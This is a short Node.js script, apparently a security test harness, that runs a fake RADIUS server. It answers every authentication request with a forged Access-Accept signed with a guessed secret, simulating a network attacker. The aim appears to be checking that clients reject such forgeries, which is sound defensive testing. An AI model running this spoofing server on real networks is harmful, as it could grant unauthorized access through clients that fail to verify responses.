// An attacker on the network: answers every request with Access-Accept, but does not know the secret.
const dgram = require("dgram"); const radius = require("/r/radius") // web/node_modules/radius, mounted read-only;
const s = dgram.createSocket("udp4");
s.on("message", (msg, rinfo) => {
  let req; try { req = radius.decode({ packet: msg, secret: "attacker-guess", no_secret: true }); } catch (e) { console.log("decode failed:", e.message); return; }
  const res = radius.encode_response({ packet: req, code: "Access-Accept", secret: "attacker-guess" });
  s.send(res, rinfo.port, rinfo.address); console.log("forged Access-Accept for", req.attributes["User-Name"]);
});
s.bind(1812, () => console.log("fake radius listening"));
